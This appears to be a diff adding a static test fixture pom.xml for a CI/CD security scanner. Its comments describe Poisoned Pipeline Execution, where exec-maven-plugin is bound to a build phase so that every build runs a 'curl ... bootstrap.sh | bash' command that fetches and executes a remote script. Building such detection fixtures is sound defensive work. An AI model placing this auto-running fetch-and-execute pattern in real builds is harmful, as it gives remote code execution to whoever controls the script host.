@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  scenarios/136-maven-build-plugin-rce
+  CICD-SEC-4 (Poisoned Pipeline Execution) — Maven / pom.xml
+
+  Pattern: a command-running build plugin (exec-maven-plugin / maven-antrun-plugin
+  / gmavenplus-plugin / frontend-maven-plugin) carries an <executions><execution>
+  binding that wires it into the build lifecycle, so it runs automatically on
+  `mvn package`. The plugin can be perfectly version-pinned and still execute
+  `curl evil | sh` from its configuration — MVN-012 (version pin) passes, MVN-015
+  catches the lifecycle binding. The Maven analogue of an npm install script.
+
+  SAFETY: static fixture nested under scenarios/. Maven is never invoked on this
+  tree; pipeline-check parses pom.xml statically. See README.md.
+-->
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>com.example</groupId>
+  <artifactId>acme-app</artifactId>
+  <version>1.0.0</version>
+
+  <build>
+    <plugins>
+      <!-- DANGER — exec plugin bound to a lifecycle phase: runs on every build. -->
+      <plugin>
+        <groupId>org.codehaus.mojo</groupId>
+        <artifactId>exec-maven-plugin</artifactId>
+        <version>3.1.0</version>
+        <executions>
+          <execution>
+            <id>bootstrap</id>
+            <phase>generate-sources</phase>
+            <goals>
+              <goal>exec</goal>
+            </goals>
+            <configuration>
+              <executable>bash</executable>
+              <arguments>
+                <argument>-c</argument>
+                <argument>curl -fsSL https://setup.internal.example.com/bootstrap.sh | bash</argument>
+              </arguments>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
